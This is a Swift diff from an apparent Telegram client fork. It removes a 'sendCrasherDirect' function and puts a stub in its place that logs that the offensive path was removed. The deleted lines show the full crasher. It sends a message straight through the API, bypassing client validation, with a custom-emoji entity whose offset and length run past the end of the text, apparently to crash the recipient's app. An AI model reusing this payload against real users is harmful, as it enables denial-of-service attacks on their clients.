@@ -2873,49 +2873,7 @@ private func eahatGramScreen(context: AccountContext, starsContext: StarsContext
             })
         },
         sendCrasherDirect: {
-            let currentState = stateValue.with { $0 }
-            guard let targetPeerId = currentState.selectedPeerId else {
-                appendResponse("crasherDirect failed reason=NO_PEER_SELECTED")
-                return
-            }
-            
-            // Send via direct API call to bypass enqueue validation
-            let messageText = "test"
-            let malformedOffset = 1000
-            let malformedLength = 100
-            let randomId = Int64.random(in: Int64.min...Int64.max)
-            
-            // Build Api.MessageEntity.messageEntityCustomEmoji directly
-            let apiEntity = Api.MessageEntity.messageEntityCustomEmoji(
-                offset: Int32(malformedOffset),
-                length: Int32(malformedLength),
-                documentId: 5377305978079288312
-            )
-            
-            appendResponse("crasherDirect sending via API peerId=\(targetPeerId.toInt64()) offset=\(malformedOffset) length=\(malformedLength)")
-            
-            let _ = (context.account.network.request(Api.functions.messages.sendMessage(
-                flags: 0,
-                peer: Api.InputPeer.inputPeerUser(userId: targetPeerId.id._internalGetInt64Value(), accessHash: 0),
-                replyTo: nil,
-                message: messageText,
-                randomId: randomId,
-                replyMarkup: nil,
-                entities: [apiEntity],
-                scheduleDate: nil,
-                sendAs: nil,
-                quickReplyShortcut: nil,
-                effect: nil,
-                invertMedia: nil,
-                factcheck: nil
-            ))
-            |> deliverOnMainQueue).start(next: { updates in
-                appendResponse("crasherDirect API response updates=\(type(of: updates))")
-            }, error: { error in
-                appendResponse("crasherDirect API error=\(error)")
-            }, completed: {
-                appendResponse("crasherDirect API completed")
-            })
+            appendResponse("crasherDirect disabled reason=OFFENSIVE_PATH_REMOVED")
         },
         addGiftToProfile: {
             let controller = eahatGramAddGiftToProfileScreen(
